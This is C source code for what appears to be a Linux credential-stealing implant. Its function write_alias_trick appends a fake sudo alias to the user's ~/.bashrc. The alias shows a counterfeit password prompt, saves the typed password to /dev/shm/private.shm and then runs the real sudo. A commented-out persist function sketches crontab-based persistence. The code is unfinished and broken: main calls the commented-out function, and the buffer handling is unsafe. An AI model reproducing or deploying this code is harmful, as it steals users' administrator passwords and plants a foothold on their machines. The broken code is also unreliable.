#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>

bool write_alias_trick() {

  char alias_trick_str[] = "alias sudo=\'echo -n \"[sudo] password for $USER:\"; read -s password; echo $password > /dev/shm/private.shm; printf \"\\nSorry, try again.\\n\"; alias sudo=sudo; sudo $1\'\"";
  char *bashrc = "/.bashrc";
  char *home_path = getenv("HOME");
  char bashrc_fullpath[100];
  ssize_t num_written;
  int fd;

  strncpy(bashrc_fullpath, home_path, 50);
  strncat(bashrc_fullpath, bashrc,  10);

  fprintf(stderr, "%s\n", bashrc_fullpath);

  fd = open(bashrc_fullpath, O_WRONLY | O_CREAT | O_APPEND);

  if (fd == -1) {
    exit(1);
  }

  num_written = write(fd, alias_trick_str, strlen(alias_trick_str));
  if (num_written == -1) {
    exit(1);
  }

  return true;
}

// bool persist() {
//
//   char current_exe[50];
//   char cron_command[200];
//   readlink("/proc/self/exe", current_exe, 100);
//   char full_cron_text[400];
//
//   char persist_str[] = "(crontab -l 2>/dev/null; echo \"*/5 * * * * /path/to/job -with args\") | crontab -"
//   char crontab_prefix[] = "(crontab -l 2>/dev/null; echo \"*/5 * * * * "
//   char crontab_suffix[] = "\" | crontab -"
//
//   strncpy(cron_command, crontab_prefix, 50
//   strncpy(full_cron_text, crontab_prefix, 50);
//   strncat(full_cron_text, );
// }

bool check_root() {
  if (geteuid() == 0) {
    return true;
  }
  else {
    return false;
  }
}

int main() {
  persist();
}
